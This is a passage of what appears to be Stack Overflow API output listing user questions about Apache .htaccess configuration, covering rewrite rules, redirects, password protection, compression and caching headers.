HTTP/1.1\" 403 256\n</code></pre>\n"},{"tags":["apache",".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":12,"score":0,"question_id":13202924,"title":"forward all ports via htaccess to new address","body":"<p>I have a chat server running on my local machine that listens to different ports. I want to use the sub-domain of one of my accounts to access it. I intend to manually change the redirect whenever my local machine gets a different ip address.</p>\n\n<p>So: \n<code>chat.example.com:123</code> would redirect to <code>dynamic.ip.address:123</code></p>\n\n<p>I am trying to accomplish this with .htaccess and RewriteRule\nI have tried:</p>\n\n<pre><code>RewriteEngine on\nRewriteRule ^(.*) http://dynamic.ip.address/ [L, R=302]\n</code></pre>\n\n<p>but this doesn't work. When I try <code>chat.example.com:123</code> nothing happens. When I input <code>chat.example.com</code> into the web browser, I get dynamic.ip.address</p>\n\n<p>Is .htaccess the right tool for this?</p>\n\n<p>I am using a simple web host that gives me ssh access, but not much more.</p>\n"},{"tags":[".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":9,"score":0,"question_id":13194357,"title":"Url rewriting htaccess","body":"<p>I have the link: domain.com/activate/\nThat works, in the activate page i have get form. And if i run that i get:\ndomain.com/activate/?code=heresomecodething</p>\n\n<p>But that doesnt work.\nMy original url is: domain.com/index.php?p=activate&amp;code=heresomecodething\nI want that i works like this: domain.com/activate/code=heresomecodething\nHow can i do that??</p>\n\n<p>My htaccess:</p>\n\n<pre><code> RewriteEngine On\nRewriteRule ^(.*)/$ index.php?p=$1 [L]\n</code></pre>\n\n<p>I hope you under stand me.</p>\n\n<p>Thanks!\n- Marijn</p>\n"},{"tags":[".htaccess","dns"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":21,"score":0,"question_id":13202622,"title":"how to add a sub domain .htaccess pointing to a folder outside the root","body":"<p>I want to have a sub domain that points to a folder outside the normal public root folder.</p>\n\n<pre><code>httpdocs/\nsub_dom/\n</code></pre>\n\n<p>So say \"admin.domain.com\" points to \"sub_dom\" while \"domain.com\" points to the regular httpdocs folder.</p>\n\n<ol>\n<li>is this possible</li>\n<li>is there a better solution (for example would it be better/more advisable to do it another way)</li>\n</ol>\n\n<p>Currently the htaccess file contains this but it does not seem to do the trick:</p>\n\n<pre><code>RewriteCond %{HTTP_HOST} ^admin\\.domain\\.com$\nRewriteRule ^/(.*) /var/www/vhosts/domain.com/sub_dom/admin/ [redirect,last]\n</code></pre>\n\n<p>There is most probably something very wrong with the second line maybe?</p>\n"},{"tags":["apache",".htaccess","directory"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":14,"score":0,"question_id":13199268,"title":"htaccess directive for subfolders","body":"<p>I have (.htaccess in a root directory) fancy directory listing like:</p>\n\n<p>IndexOrderDefault Descending Date</p>\n\n<p>So all subfolders are listed properly (date descending), but I only want the root to list folders alphabetically (sort by name ascending) and leave subfolders as is, creating htaccess for each subfolder isn't an option, so it has to be done within root's htaccess file.</p>\n"},{"tags":["php",".htaccess"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":119,"score":1,"question_id":9634029,"title":"How to rename first parameter by .htaccess","body":"<p>How I can rename my 1st parameter to any variable with the help of .htaccess file?</p>\n\n<p>For example, with <code>http://localhost/mysite/index.php</code>, I want to rename index.php or any other page name to some specific name.</p>\n\n<p>i.e. .htaccess returns me the following url</p>\n\n<p><code>http://localhost/mysite/page</code></p>\n\n<p>\"page\" can be any page name i.e. index.php, about.php, et cetera.  </p>\n"},{"tags":["wordpress","apache",".htaccess","http-status-code-404","internal-server-error"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":34,"score":0,"question_id":13200597,"title":"I don't know where to start...htaccess file and probably Apache?","body":"<p>I have no idea what any of this stuff means. I just know that GoDaddy tech support said it's a problem with .htaccess, WordPress and Apache.</p>\n\n<p>Briefly, when I remove the .htaccess file from the root directory, my blog's pages and category links result in an Internal Server Error, while the custom 404 pages in my other site's directories work fine.</p>\n\n<p>And vice versa.  When I put a blank .htaccess file on the root directory, my blog works and my other directory sites get an Internal Server Error instead of the custom 404.</p>\n\n<p>I did a screencast video to actually explain and show the problem I'm having and hopefully someone can figure it out and point me in the right direction.</p>\n\n<p>As far as writing code - I can copy/paste what I'm given but I'm not a programmer.  This is all foreign to me and it's really very frustrating.</p>\n\n<p>Here is the video on YouTube that will better explain what is happening, in case I haven't explained it correctly.  </p>\n\n<p><a href=\"http://youtu.be/8FL1ihplQws\" rel=\"nofollow\">http://youtu.be/8FL1ihplQws</a></p>\n\n<p>Thank you!</p>\n\n<p>Karen</p>\n"},{"tags":[".htaccess","bots"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":19,"score":0,"question_id":13021531,"title":".htaccess to restrict bot activity","body":"<p>I have a bot that is trying to access my site by entering what appear to be keywords or passcodes. The entries come from dozens of different IPs and locations, so I can't block via IP, location, or referrer. </p>\n\n<p>The bot attempts to visit a page like this:</p>\n\n<p><a href=\"http://www.website.com/valid-page/?kwd=du2c3m\" rel=\"nofollow\">http://www.website.com/valid-page/?kwd=du2c3m</a></p>\n\n<p>Always in this format and the 'valid-page' is always the same page. I get as many as 400 of these attempts a day, and have been getting them for over a week.</p>\n\n<p>My question is, how can I use .htaccess to block these attempts? I'm sure it's relatively straightforward - like blocking all '?kwd' urls or blocking all subdirectories of the 'valid-page'</p>\n\n<p>Any thoughts? I really appreciate it.</p>\n"},{"tags":["apache",".htaccess","codeigniter"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":47,"score":1,"question_id":13198068,"title":"How can I remove \"index.php\" from my links?","body":"<p>Normally I access a page like this: <code>http://localhost/codeigniter/index.php/auth/login</code>\nHowever I want to be able to access to the page like this : <code>http://localhost/codeigniter/auth/login</code></p>\n\n<p>I have no information about <code>http.conf</code> and <code>.htaccess</code> configurations.</p>\n\n<p>I have set <code>$config['index_page'] = '';</code> in <code>codeigniter/application/config/config.php</code></p>\n\n<p>my http.conf file is at its default except uncommentnig \"<code>LoadModule rewrite_module modules/mod_rewrite.so</code>\"</p>\n\n<p>I inspected many proposed .htaccess files but I could not understand the logic behind the rewriting rules.</p>\n\n<p>Here is the most successful <code>.htaccess</code> content for me. It is located at <code>/www/CodeIgniter/</code> .<br>\n(by the most successful I mean that this is the only one that gives 404 error created by the CodeIgniter not by the server.)</p>\n\n<pre><code>    RewriteOptions Inherit\nOptions -Indexes\nOptions +FollowSymLinks\nRewriteBase /CodeIgniter/\n# Set the default file for indexes\nDirectoryIndex index.php\n\n&lt;IfModule mod_rewrite.c&gt;\n\n    # activate URL rewriting\n    RewriteEngine on\n\n    # do not rewrite links to the documentation, assets and public files\n    RewriteCond $1 !^(images|assets|uploads|captcha)\n\n    # do not rewrite for php files in the document root, robots.txt or the maintenance page\n    RewriteCond $1 !^([^\\..]+\\.php|robots\\.txt)\n\n    # but rewrite everything else\n    RewriteRule ^(.*)$ index.php/$1 [L]\n&lt;/IfModule&gt;\n\n&lt;IfModule !mod_rewrite.c&gt;\n\n    # If we don't have mod_rewrite installed, all 404's\n    # can be sent to index.php, and everything works as normal.\n\n    ErrorDocument 404 index.php\n\n&lt;/IfModule&gt;\n</code></pre>\n\n<p>I hate requesting direct solutions however unfortunately, it is my last resort :/\nCan you give me a right solution to my problem?</p>\n"},{"tags":["regex",".htaccess","redirect"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":25,"score":1,"question_id":13191778,"title":"Redirection in .htaccess with variable parameters and pass through","body":"<p>I've having trouble working out the correct entries to put into my .htaccess file.</p>\n\n<p>What I'm trying to do is:</p>\n\n<p><strong>1) Allow all requests for certain file types to work correctly. (ie jpg|gif|png|css|js|ico)</strong></p>\n\n<p>This will allow all files included with web pages to work correctly.</p>\n\n<p><strong>2) All requests to \"login\" to be redirected to login page, with parameters. eg</strong></p>\n\n<pre><code>/login\n/Login        (different case)\n/login/\n/login/index.py\n/login/scipt/index.py\n/login?id=1&amp;attr=foobar\n/login/index.py?mode=1&amp;attr=foobar?name=Billy\n/login/scipt/index.py?index=999\n/login/?anotherparam=value      (basically, the parameter list can vary)\n</code></pre>\n\n<p>Should ALL redirect to:</p>\n\n<pre><code>/login.py\n</code></pre>\n\n<p>And those with GET parameters, should redirect to:</p>\n\n<pre><code>/login.py?(copied list of parameters without these brackets)\n</code></pre>\n\n<p><strong>3) Everything else should be redirected to root (ie '/') keeping any parameters. eg</strong></p>\n\n<pre><code>/NotAPage.html\n/NotAFolder/\n/NotAFolder/NotAPage.html\n/NotAPage.html?v=1&amp;k=2\n/NotAFolder/?a=2\n/NotAFolder/NotAPage.html?a=99&amp;b=55&amp;c=99   (again, the parameter list can vary)\n</code></pre>\n\n<p>Should ALL redirect to:</p>\n\n<pre><code>/\n</code></pre>\n\n<p>And those with GET parameters, should redirect to:</p>\n\n<pre><code>/?(copied list of parameters without these brackets)\n</code></pre>\n\n<hr>\n\n<p>So far, I've gotten this far:</p>\n\n<pre><code>#Make PY (Python) files executable outside of CGI-BIN\nAddHandler cgi-script .py\nOptions +ExecCGI\n\n# Turn on URL rewriting engine\nRewriteEngine On\n\n# Allow these file types to pass through untouched\nRewriteCond %{REQUEST_URI} !\\.(jpg|gif|png|css|js|ico)$\n# Redirect all other requests to index.py\nRewriteRule (.*) index.py [L,PT]\n</code></pre>\n\n<p>Which, I believe, is getting everything (except the list of suffixes) to redirect to index.py, with parameters, but it's not doing everything I need yet.</p>\n\n<p>Can anyone point me in the right direction please?</p>\n"},{"tags":[".htaccess"],"answer_count":0,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":16,"score":0,"question_id":13200518,"title":".htaccess internal server error 500 mod_rewrite looping","body":"<p>Very new to .htaccess and I think I have a looping problem somewhere.  I want example.com/test.php?title=something to look like example.com/test/something however I am getting a 500 error when going to example.com/test/something. After doing research it sounds like I have a redirect loop, however I'm not sure how to distinguish it or fix it. Here is my .htaccess file</p>\n\n<pre><code>Options +FollowSymLinks -MultiViews\nrewriteengine on\n\nRewriteBase /\n\nRewriteCond %{THE_REQUEST} ^[A-Z]{3,}\\s/test\\.php\\?title=([^&amp;\\ ]+)\nRewriteRule ^ /test/%1? [L,R=301]\nRewriteRule ^/?test/(.*)$ /test.php?title=$1 [L]\n\nrewritecond %{HTTP_HOST} ^example.com$\nrewriterule ^kungfu\\/(.*)$ \"http\\:\\/\\/www\\.example\\.com\\/$1\" [R=301]\n\n## Hide .php extension\n# To externally redirect /dir/foo.php to /dir/foo\nRewriteCond %{THE_REQUEST} ^[A-Z]{3,}\\s([^.]+)\\.php [NC]\nRewriteRule ^ %1 [R,L,NC]\n\n## To internally redirect /dir/foo to /dir/foo.php\nRewriteCond %{REQUEST_FILENAME}.php -f\nRewriteRule ^ %{REQUEST_URI}.php [L]\n\nErrorDocument 404 http://www.example.com/404\n</code></pre>\n"},{"tags":[".htaccess","nginx","rewrite"],"answer_count":4,"favorite_count":4,"up_vote_count":4,"down_vote_count":0,"view_count":9050,"score":4,"question_id":5840497,"title":"convert htaccess to nginx","body":"<p>I'm having no luck converting htaccess rules to nginx rewrite. I've checked out the NginxRewriteModule documentation and have a few done, but the more complicate ones I'm at a loss for.  Here's what I'm looking at:</p>\n\n<pre><code>RewriteRule    ^$                                               /cgi-bin/index.cgi [L]\nRewriteRule    ([0-9A-Za-z]{12})-del-([0-9A-Za-z]+)/.+$         /cgi-bin/index.cgi?del=$1-$2 [L]\n\nRewriteCond     %{REQUEST_FILENAME} !-f\n\nRewriteRule    ^([0-9A-Za-z]{12})(\\.html?|$)$                   /cgi-bin/index.cgi?op=download1&amp;id=$1 [L]\nRewriteRule    ^([0-9A-Za-z]{12})(\\/.+|\\.html?|$)               /cgi-bin/index.cgi?op=download1&amp;id=$1&amp;fname=$2 [L]\nRewriteRule    ^([0-9A-Za-z\\-_]{4,64})/([0-9A-Za-z]{12})$   /cgi-bin/index.cgi?op=download1&amp;usr_login=$1&amp;id=$2 [L]\nRewriteRule    ^([0-9A-Za-z\\-_]{4,64})/([0-9A-Za-z]{12})(\\/.+|\\.html?|$)        /cgi-bin/index.cgi?op=download1&amp;usr_login=$1&amp;id=$2&amp;fname=$3 [L]\n\n#RewriteRule    ^Reseller\\.html$                                         /cgi-bin/Templates/Pages/english/Reseller.html [L]\nRewriteRule    ^checkfiles\\.html$                                       /cgi-bin/index.cgi?op=checkfiles [L]\nRewriteRule    ^contact\\.html$                                          /cgi-bin/index.cgi?op=contact [L]\nRewriteRule    ^premium\\.html$                                          /cgi-bin/index.cgi?op=payments [L]\nRewriteRule    ^login\\.html$                                            /cgi-bin/index.cgi?op=login [L]\nRewriteRule    ^catalogue(.*)\\.html$                                    /cgi-bin/index.cgi?op=catalogue&amp;date=$1 [L]\nRewriteRule    ^news([0-9]*)\\.html$                                     /cgi-bin/index.cgi?op=news&amp;page=$1 [L]\nRewriteRule    ^n([0-9]+)-.*\\.html$                                     /cgi-bin/index.cgi?op=news_details&amp;news_id=$1 [L]\nRewriteRule    ^free([0-9]+)\\.html$                     /cgi-bin/index.cgi?op=registration&amp;aff_id=$1 [L]\nRewriteRule    ^users/([0-9A-Za-z\\-_]{4,64})/?([0-9]+|$)        /cgi-bin/index.cgi?op=user_public&amp;usr_login=$1&amp;fld_id=$2 [L,NC]\nRewriteRule    ^embedmp3-([0-9A-Za-z]{12})\\.html$   /cgi-bin/index.cgi?op=mp3_embed&amp;file_code=$1 [L]\nRewriteRule    ^embedmp4-([0-9A-Za-z]{12})\\.html$   /cgi-bin/index.cgi?op=mp32_embed&amp;file_code=$1 [L]\nRewriteRule    ^box$                                    /cgi-bin/index_box.cgi [L]\n\nRewriteCond     %{REQUEST_FILENAME} !-f\nRewriteCond     %{REQUEST_FILENAME} !-d\nRewriteRule    ^([0-9A-Za-z\\-_]{4,64})(/[^\\/]*/?|$)$            /cgi-bin/index.cgi?op=user_public&amp;usr_login=$1&amp;fld=$2 [L,NC]\n\nRewriteCond     %{REQUEST_FILENAME} !-f\nRewriteRule    ^([a-z0-9\\-\\_]+).html(.*)                        /cgi-bin/index.cgi?op=page&amp;tmpl=$1$2 [L]\n</code></pre>\n"},{"tags":[".htaccess","redirect","subdomain","subfolder","mod"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":19,"score":0,"question_id":13199435,"title":"Redirect subfolder index.php to subfolder root","body":"<p>I have the following url I want redirect using the .htaccess file in root with Mod Rewrite. I have searched and found good examples for the index file in root, but not in subfolder.\nThis is what I have and what I need.\nThank you in advance for your help.</p>\n\n<p>/folder1/index.php\n/folder1/index.php/\nto\n<a href=\"http://www.example.com/folder1/\" rel=\"nofollow\">http://www.example.com/folder1/</a></p>\n\n<p>/folder2/index.php\n/folder2/index.php/\nto\n<a href=\"http://www.example.com/folder2/\" rel=\"nofollow\">http://www.example.com/folder2/</a></p>\n\n<p>I was asked for only 2 hyperlinks so I removed part of the link on the examples above. I appreciate the shorter way because I have many folders.</p>\n"}]}
{"total":14527,"page":3,"pagesize":100,"questions":[{"tags":[".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":26,"score":0,"question_id":12835468,"title":"Error 324 with \"Require user\"","body":"<p>I got error 324 when I try to connect to a protected directory on my website. This is my .htaccess file:</p>\n\n<pre><code>Require user user1 user2 user3\nAuthType     Basic\nAuthName     this_protected_area\nAuthUserFile /home/domain.nl/public_html/.htpasswd\n</code></pre>\n\n<p>When I comment the <code>Require user</code> line, then I've no error but also no login popup. So whats wrong with the htaccess file?</p>\n"},{"tags":["apache",".htaccess","ubuntu",".htpasswd"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":45,"score":0,"question_id":12657574,"title":"Trouble with .htpasswd login screen not being displayed","body":"<p>I am trying to setup a password protected directory on my localhost.</p>\n\n<p>The <code>.htaccess</code> file is located in <code>/var/www/project/code/server/development</code> and the <code>.htpasswd</code> file is located in the <code>/home/adarshakb/.htpasswd</code></p>\n\n<p>The .htaccess file contains:</p>\n\n<pre><code>AuthType Basic\nAuthName Restricted\nAuthUserFile /home/adarshakb/.htpasswd\nrequire valid-user\n</code></pre>\n\n<p>and the <code>.htpasswd</code> contains:</p>\n\n<pre><code>user:HkCKfIOQNlS1E\n</code></pre>\n\n<p>Now, if I go to <code>http://localhost/project/code/server/development/</code> It doesnt ask for any authentication and just opens up.</p>\n\n<p>What is wrong here?</p>\n"},{"tags":["apache",".htaccess","authentication","htpasswd"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":54,"score":0,"question_id":12906957,"title":"Authenticate Subdirectories","body":"<p>Here's a picture of a folder inside the root directory my website:<br>\n<img src=\"http://i.stack.imgur.com/eeDBY.png\" alt=\"Directory\">\n<br>I want to have htaccess require an authentication to access any of these folders. So no one can type in <code>www.domain.com/Folder/CSS</code> and access it without the correct username and password. So far I've tried:</p>\n\n<pre><code>&lt;DirectoryMatch \"^*\"&gt;\n    AuthType Basic\n    AuthName \"Login\"\n    AuthUserFile /disks/*/*/Folder/.htpasswd\n    Require valid-user\n&lt;/DirectoryMatch&gt;\n</code></pre>\n\n<p>This is to make it secure all the subdirectories (<code>classes, cs, images, js</code>) but instead when I type in <code>www.domain.com/Folder/Front.php</code> it comes up with:</p>\n\n<pre><code>Internal Server Error\n</code></pre>\n\n<p>With no console error. How do I make htaccess authenticate all the subdirectories (BUT NOT FRONT.PHP!)?</p>\n"},{"tags":["php",".htaccess"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":49,"score":0,"question_id":13121988,"title":"htaccess not finding .htpasswd file","body":"<p>I'm trying to password protect a directory on my site. I can get the .htaccess working so that when I visit the directory a password prompt is shown, however when I put the correct credentials that I've stored within my .htpasswd file I am not granted access. The password prompt just pops up again. </p>\n\n<p>I believe it's a problem with the path to the .htpasswd file in the .htaccess file. I've checked my document root (_SERVER[\"DOCUMENT_ROOT\"]) and it shows that the root is this: </p>\n\n<pre><code>/var/www/vhosts/myurl.info/httpdocs\n</code></pre>\n\n<p>so my .htaccess looks like so:</p>\n\n<pre><code>AuthName \"Restricted Area\"\nAuthType Basic \nAuthUserFile /var/www/vhosts/myurl.info/httpdocs/.htpasswd \nAuthGroupFile /dev/null \nrequire valid-user\n</code></pre>\n\n<p>I've put the .htpasswd in the root document folder (httpdocs).</p>\n\n<p>Any ideas what I'm doing wrong? Everything looks correct to me.</p>\n"},{"tags":["wordpress",".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":51,"score":0,"question_id":13085284,"title":"wordpress yslow Grade F on Compress components with gzip","body":"<p>I have some issues with gzip (according to yslow) for css and js files. \nI tried many different ways to implement the code in .htaccess but nothing works.</p>\n\n<p>I cannot figure out what can be wrong - if I check in Firebug, there is no compression at all on this files. I tested also in some web sites (html files are compressed, but other not).</p>\n\n<p>Do you have any suggestions?</p>\n\n<p>Mainly I'm using .htaccess suggestions from <a href=\"https://github.com/h5bp/html5-boilerplate/blob/master/.htaccess\" rel=\"nofollow\">https://github.com/h5bp/html5-boilerplate/blob/master/.htaccess</a> </p>\n\n<p>I'd appreaciate very much your help ...</p>\n\n<pre><code>&lt;IfModule mod_deflate.c&gt;\n\n  # Force deflate for mangled headers developer.yahoo.com/blogs/ydn/posts/2010/12/pushing-beyond-gzipping/\n  &lt;IfModule mod_setenvif.c&gt;\n    &lt;IfModule mod_headers.c&gt;\n      SetEnvIfNoCase ^(Accept-EncodXng|X-cept-Encoding|X{15}|~{15}|-{15})$ ^((gzip|deflate)\\s*,?\\s*)+|[X~-]{4,13}$ HAVE_Accept-Encoding\n      RequestHeader append Accept-Encoding \"gzip,deflate\" env=HAVE_Accept-Encoding\n    &lt;/IfModule&gt;\n      BrowserMatch ^Mozilla/4 gzip-only-text/html\n      BrowserMatch ^Mozilla/4\\.0[678] no-gzip\n      BrowserMatch \\bMSIE !no-gzip !gzip-only-text/html\n  &lt;/IfModule&gt;\n\n  # HTML, TXT, CSS, JavaScript, JSON, XML, HTC:\n  &lt;IfModule filter_module&gt;\n    FilterDeclare   COMPRESS\n    FilterProvider  COMPRESS  DEFLATE resp=Content-Type $text/html\n    FilterProvider  COMPRESS  DEFLATE resp=Content-Type $text/css\n    FilterProvider  COMPRESS  DEFLATE resp=Content-Type $text/plain\n    FilterProvider  COMPRESS  DEFLATE resp=Content-Type $text/xml\n    FilterProvider  COMPRESS  DEFLATE resp=Content-Type $text/x-component\n    FilterProvider  COMPRESS  DEFLATE resp=Content-Type $application/javascript\n    FilterProvider  COMPRESS  DEFLATE resp=Content-Type $application/json\n    FilterProvider  COMPRESS  DEFLATE resp=Content-Type $application/xml\n    FilterProvider  COMPRESS  DEFLATE resp=Content-Type $application/xhtml+xml\n    FilterProvider  COMPRESS  DEFLATE resp=Content-Type $application/rss+xml\n    FilterProvider  COMPRESS  DEFLATE resp=Content-Type $application/atom+xml\n    FilterProvider  COMPRESS  DEFLATE resp=Content-Type $application/vnd.ms-fontobject\n    FilterProvider  COMPRESS  DEFLATE resp=Content-Type $image/svg+xml\n    FilterProvider  COMPRESS  DEFLATE resp=Content-Type $image/x-icon\n    FilterProvider  COMPRESS  DEFLATE resp=Content-Type $application/x-font-ttf\n    FilterProvider  COMPRESS  DEFLATE resp=Content-Type $font/opentype\n    FilterChain     COMPRESS\n    FilterProtocol  COMPRESS  DEFLATE change=yes;byteranges=no\n  &lt;/IfModule&gt;\n\n  &lt;IfModule !mod_filter.c&gt;\n    # Legacy versions of Apache\n    AddOutputFilterByType DEFLATE text/html text/plain text/css application/json\n    AddOutputFilterByType DEFLATE application/javascript\n    AddOutputFilterByType DEFLATE text/xml application/xml text/x-component\n    AddOutputFilterByType DEFLATE application/xhtml+xml application/rss+xml application/atom+xml\n    AddOutputFilterByType DEFLATE image/x-icon image/svg+xml application/vnd.ms-fontobject application/x-font-ttf font/opentype\n  &lt;/IfModule&gt;\n\n&lt;/IfModule&gt;\n\n&lt;ifModule mod_gzip.c&gt;\nmod_gzip_on Yes\nmod_gzip_dechunk Yes\nmod_gzip_item_include file \\.(html?|txt|css|js|php)$\nmod_gzip_item_include handler ^cgi-script$\nmod_gzip_item_include mime ^text/.*\nmod_gzip_item_include mime ^application/x-javascript.*\nmod_gzip_item_exclude mime ^image/.*\nmod_gzip_item_exclude rspheader ^Content-Encoding:.*gzip.*\n&lt;/ifModule&gt;\n\n\n# ----------------------------------------------------------------------\n# Expires headers (for better cache control)\n# ----------------------------------------------------------------------\n\n# These are pretty far-future expires headers.\n# They assume you control versioning with filename-based cache busting\n# Additionally, consider that outdated proxies may miscache\n#   www.stevesouders.com/blog/2008/08/23/revving-filenames-dont-use-querystring/\n\n# If you don't use filenames to version, lower the CSS  and JS to something like\n#   \"access plus 1 week\" or so.\n\n&lt;IfModule mod_expires.c&gt;\n  ExpiresActive on\n\n# Perhaps better to whitelist expires rules? Perhaps.\n  ExpiresDefault                          \"access plus 1 month\"\n\n# cache.appcache needs re-requests in FF 3.6 (thanks Remy ~Introducing HTML5)\n  ExpiresByType text/cache-manifest       \"access plus 0 seconds\"\n\n# Your document html\n  ExpiresByType text/html                 \"access plus 0 seconds\"\n\n# Data\n  ExpiresByType text/xml                  \"access plus 0 seconds\"\n  ExpiresByType application/xml           \"access plus 0 seconds\"\n  ExpiresByType application/json          \"access plus 0 seconds\"\n\n# Feed\n  ExpiresByType application/rss+xml       \"access plus 1 hour\"\n  ExpiresByType application/atom+xml      \"access plus 1 hour\"\n\n# Favicon (cannot be renamed)\n  ExpiresByType image/x-icon              \"access plus 1 week\"\n\n# Media: images, video, audio\n  ExpiresByType image/gif                 \"access plus 1 month\"\n  ExpiresByType image/png                 \"access plus 1 month\"\n  ExpiresByType image/jpg                 \"access plus 1 month\"\n  ExpiresByType image/jpeg                \"access plus 1 month\"\n  ExpiresByType video/ogg                 \"access plus 1 month\"\n  ExpiresByType audio/ogg                 \"access plus 1 month\"\n  ExpiresByType video/mp4                 \"access plus 1 month\"\n  ExpiresByType video/webm                \"access plus 1 month\"\n\n# HTC files  (css3pie)\n  ExpiresByType text/x-component          \"access plus 1 month\"\n\n# Webfonts\n  ExpiresByType application/x-font-ttf    \"access plus 1 month\"\n  ExpiresByType font/opentype             \"access plus 1 month\"\n  ExpiresByType application/x-font-woff   \"access plus 1 month\"\n  ExpiresByType image/svg+xml             \"access plus 1 month\"\n  ExpiresByType application/vnd.ms-fontobject \"access plus 1 month\"\n\n# CSS and JavaScript\n  ExpiresByType text/css                  \"access plus 1 year\"\n  ExpiresByType application/javascript    \"access plus 1 year\"\n  ExpiresByType text/javascript         \"access plus 1 year\"\n&lt;/IfModule&gt;\n\n# Enable Compresion\n&lt;FilesMatch \".(js|css|html|htm|php|xml)$\"&gt;\nSetOutputFilter DEFLATE\n&lt;/FilesMatch&gt;\n\n# ----------------------------------------------------------------------\n# ETag removal\n# ----------------------------------------------------------------------\n\n# FileETag None is not enough for every server.\n&lt;IfModule mod_headers.c&gt;\n  Header unset ETag\n&lt;/IfModule&gt;\n\n# Since we're sending far-future expires, we don't need ETags for\n# static content.\n#   developer.yahoo.com/performance/rules.html#etags\nFileETag None\n</code></pre>\n"},{"tags":["apache",".htaccess","htpasswd"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":108,"score":0,"question_id":10675461,"title":"can get it work htpasswd","body":"<p>i can get the .htpasswd to work with .htaccess</p>\n\n<p>I have the following lines in htacess</p>\n\n<pre><code>&lt;Files \".htaccess\"&gt;\norder allow,deny\ndeny from all\n&lt;/Files&gt;\nAuthUserFile /var/www/example/.htpasswd\nAuthName \"Restricted Area\"\nAuthType Basic\nRequire valid-user  \n\nRewriteEngine On\n\nRewriteCond %{REQUEST_FILENAME} !-f\n\nRewriteRule ^(.+)$ /index.php/$1\n\n\n\nand htpasswd look as it follows\n\nuser:passw\n&lt;Files \".htpasswd\"&gt;\norder allow,deny\ndeny from all\n&lt;/Files&gt;\n</code></pre>\n\n<p>I'm trying to log in but without success\napache error.log tells\n \"/\": Password Mismatch but I have been checking couple of times everything is okay with it.</p>\n"},{"tags":["apache",".htaccess","subfolder","htpasswd"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":21,"score":0,"question_id":13157312,"title":"Different .htpasswd for subfolder?","body":"<p>The root folder of a web app is protected with a .htaccess/.htpasswd file. That works fine even with sub-folders, and everything is perfect.</p>\n\n<p>Now I have to password protect a subfolder using a different .htpasswd file. I tried using a new .htaccess/.htpasswd combo into the subfolder and it kinda works, except for the fact that I need to enter two usernames and passwords (one for the subfolder and one for the .htaccess/.htpasswd in the root folder).</p>\n\n<p>Is there a way to avoid that?</p>\n\n<p>Thanks</p>\n"},{"tags":["html","apache",".htaccess","redirect","hosting"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":16,"score":0,"question_id":13185780,"title":"htaccess mobile redirect to subdirectory","body":"<p>I've adapted a htaccess file that was provided here <a href=\"http://stackoverflow.com/questions/3680463/mobile-redirect-using-htaccess\">Mobile Redirect using htaccess</a> however, what I'm trying to do is to check the user is not already in the subfolder(rather than sub domain) domain.co.uk/mobile and if not, redirect them to the mobile site. </p>\n\n<p>However, this just drops into an infinite loop and therefore fails.</p>\n\n<p>Can anyone tell me what the problem is and how I do this kind of RewriteCond? </p>\n\n<pre><code>RewriteEngine on\nRewriteBase /\n\n# Check if this is the noredirect query string\nRewriteCond %{QUERY_STRING} (^|&amp;)m=0(&amp;|$)\n# Set a cookie, and skip the next rule\nRewriteRule ^ - [CO=mredir:0:www.domain.co.uk]\n\nRewriteCond %{HTTP:x-wap-profile} !^$ [OR]\nRewriteCond %{HTTP:Profile}       !^$ [OR]\nRewriteCond %{HTTP_USER_AGENT} \"acs|alav|alca|amoi|audi|aste|avan|benq|bird|blac|blaz|brew|cell|cldc|cmd-\" [NC,OR]\nRewriteCond %{HTTP_USER_AGENT} \"dang|doco|eric|hipt|inno|ipaq|java|jigs|kddi|keji|leno|lg-c|lg-d|lg-g|lge-\" [NC,OR]\nRewriteCond %{HTTP_USER_AGENT}  \"maui|maxo|midp|mits|mmef|mobi|mot-|moto|mwbp|nec-|newt|noki|opwv\" [NC,OR]\nRewriteCond %{HTTP_USER_AGENT} \"palm|pana|pant|pdxg|phil|play|pluc|port|prox|qtek|qwap|sage|sams|sany\" [NC,OR]\nRewriteCond %{HTTP_USER_AGENT} \"sch-|sec-|send|seri|sgh-|shar|sie-|siem|smal|smar|sony|sph-|symb|t-mo\" [NC,OR]\nRewriteCond %{HTTP_USER_AGENT} \"teli|tim-|tosh|tsm-|upg1|upsi|vk-v|voda|w3cs|wap-|wapa|wapi\" [NC,OR]\nRewriteCond %{HTTP_USER_AGENT} \"wapp|wapr|webc|winw|winw|xda|xda-\" [NC,OR]\nRewriteCond %{HTTP_USER_AGENT} \"up.browser|up.link|windowssce|iemobile|mini|mmp\" [NC,OR]\nRewriteCond %{HTTP_USER_AGENT} \"symbian|midp|wap|phone|pocket|mobile|pda|psp\" [NC]\nRewriteCond %{HTTP_USER_AGENT} !macintosh [NC]\n\n# Check if we're not already on the mobile site\nRewriteCond %{REQUEST_URI} !^/mobile/ [NC]\n# Can not read and write cookie in same request, must duplicate condition\nRewriteCond %{QUERY_STRING} !(^|&amp;)m=0(&amp;|$) \n\n# Check to make sure we haven't set the cookie before\nRewriteCond %{HTTP_COOKIE} !^.*mredir=0.*$ [NC]\n\n# Now redirect to the mobile site\nRewriteRule ^ http://www.domain.co.uk/mobile 